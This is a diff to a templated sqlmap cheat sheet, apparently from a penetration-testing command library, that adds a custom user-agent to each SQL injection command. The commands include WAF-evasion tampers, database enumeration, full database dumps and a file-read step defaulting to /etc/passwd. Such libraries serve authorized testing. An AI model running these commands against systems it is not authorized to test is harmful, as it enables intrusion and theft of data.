@@ -14,7 +14,7 @@
 Fire-and-forget baseline against a URL (no params, no flags). Lets sqlmap auto-detect.
 
 ```bash
-sqlmap -u "{{URL:url}}"
+sqlmap -u "{{URL:url}}" --user-agent="{{UA:str:$(q-ua)}}"
 ```
 
 <!-- meta: risk=medium | phase=exploit | tags=basic,url -->
@@ -25,7 +25,7 @@ sqlmap -u "{{URL:url}}"
 Request file + specific param + max depth + batch. `--dbms=` hint speeds things up if you know the engine.
 
 ```bash
-sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --level 5 --risk 3 --batch --dbs --dbms={{DBMS:choice:mysql,mssql,postgresql,oracle,sqlite,mariadb,db2,access,sybase}}
+sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --level 5 --risk 3 --batch --dbs --user-agent="{{UA:str:$(q-ua)}}" --dbms={{DBMS:choice:mysql,mssql,postgresql,oracle,sqlite,mariadb,db2,access,sybase}}
 ```
 
 <!-- meta: risk=medium | phase=exploit | tags=request,enum,dbs -->
@@ -36,7 +36,7 @@ sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --level 5 --risk 3 --batch --dbs
 Second-order SQLi — initial injection fires in req, server stores it, second request (res.sql) triggers the SQL execution. `space2comment` tamper evades basic WAF patterns.
 
 ```bash
-sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --tamper=space2comment --level 5 --risk 3 --batch --dbs
+sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --tamper=space2comment --level 5 --risk 3 --batch --dbs --user-agent="{{UA:str:$(q-ua)}}"
 ```
 
 <!-- meta: risk=medium | phase=exploit | tags=second-order,tamper -->
@@ -47,7 +47,7 @@ sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.s
 Same as above but routes through Burp (localhost:8080). Visibility into every sqlmap-sent request.
 
 ```bash
-sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --tamper=space2comment --level 5 --risk 3 --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dbs
+sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --user-agent="{{UA:str:$(q-ua)}}" --tamper=space2comment --level 5 --risk 3 --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dbs
 ```
 
 <!-- meta: risk=medium | phase=exploit | tags=second-order,proxy,burp -->
@@ -58,7 +58,7 @@ sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.s
 Full flag stack — proxy + technique multichoice (pre-checks all 6, uncheck to narrow). `tr -d ,` strips commas so `BEUSQT` lands as one joined string.
 
 ```bash
-sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --tamper=space2comment --level 5 --risk 3 --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,T=time blind,Q=inline query}}" | tr -d ,)
+sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --user-agent="{{UA:str:$(q-ua)}}" --tamper=space2comment --level 5 --risk 3 --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,T=time blind,Q=inline query}}" | tr -d ,)
 ```
 
 <!-- meta: risk=medium | phase=exploit | tags=second-order,proxy,technique,multichoice -->
@@ -69,7 +69,7 @@ sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.s
 Bulk-test a file of URLs, no other flags — baseline scan.
 
 ```bash
-sqlmap -m {{URLS:file:urls.txt}}
+sqlmap -m {{URLS:file:urls.txt}} --user-agent="{{UA:str:$(q-ua)}}"
 ```
 
 <!-- meta: risk=medium | phase=exploit | tags=bulk,url-list -->
@@ -80,7 +80,7 @@ sqlmap -m {{URLS:file:urls.txt}}
 Full-depth scan over a URL list with tamper + technique multichoice.
 
 ```bash
-sqlmap -m {{URLS:file:urls.txt}} --tamper=space2comment --level 5 --risk 3 --batch --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,T=time blind,Q=inline query}}" | tr -d ,)
+sqlmap -m {{URLS:file:urls.txt}} --user-agent="{{UA:str:$(q-ua)}}" --tamper=space2comment --level 5 --risk 3 --batch --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,T=time blind,Q=inline query}}" | tr -d ,)
 ```
 
 <!-- meta: risk=medium | phase=exploit | tags=bulk,url-list,technique,multichoice -->
@@ -91,7 +91,7 @@ sqlmap -m {{URLS:file:urls.txt}} --tamper=space2comment --level 5 --risk 3 --bat
 Target one database by name with `-D DBNAME --dump`. Technique multichoice included.
 
 ```bash
-sqlmap -r {{REQUEST:file:sql.tst}} --tamper=space2comment --level 5 --risk 3 --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,Q=inline query}}" | tr -d ,) --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch -D {{DATABASE:str}} --dump
+sqlmap -r {{REQUEST:file:sql.tst}} --user-agent="{{UA:str:$(q-ua)}}" --tamper=space2comment --level 5 --risk 3 --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,Q=inline query}}" | tr -d ,) --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch -D {{DATABASE:str}} --dump
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=dump,named-db,technique -->
@@ -102,7 +102,7 @@ sqlmap -r {{REQUEST:file:sql.tst}} --tamper=space2comment --level 5 --risk 3 --d
 Dump every non-system database. Big noisy operation — only when you want it all.
 
 ```bash
-sqlmap -r {{REQUEST:file:sql.tst}} --tamper=space2comment --level 5 --risk 3 --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,Q=inline query}}" | tr -d ,) --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dump-all --exclude-sysdbs
+sqlmap -r {{REQUEST:file:sql.tst}} --user-agent="{{UA:str:$(q-ua)}}" --tamper=space2comment --level 5 --risk 3 --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,Q=inline query}}" | tr -d ,) --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dump-all --exclude-sysdbs
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=dump-all,sysdbs,technique -->
@@ -113,7 +113,7 @@ sqlmap -r {{REQUEST:file:sql.tst}} --tamper=space2comment --level 5 --risk 3 --d
 `--file-read=/path` works when the DB engine's file-read function is enabled (MySQL load_file, MSSQL OPENROWSET, etc). Pulls the file to local sqlmap output dir.
 
 ```bash
-sqlmap -r {{REQUEST:file:payroll.login}} --batch --file-read={{REMOTE_PATH:str:/etc/passwd}}
+sqlmap -r {{REQUEST:file:payroll.login}} --user-agent="{{UA:str:$(q-ua)}}" --batch --file-read={{REMOTE_PATH:str:/etc/passwd}}
 ```
 
 <!-- meta: risk=high | phase=post-exploit | tags=file-read,exfil -->
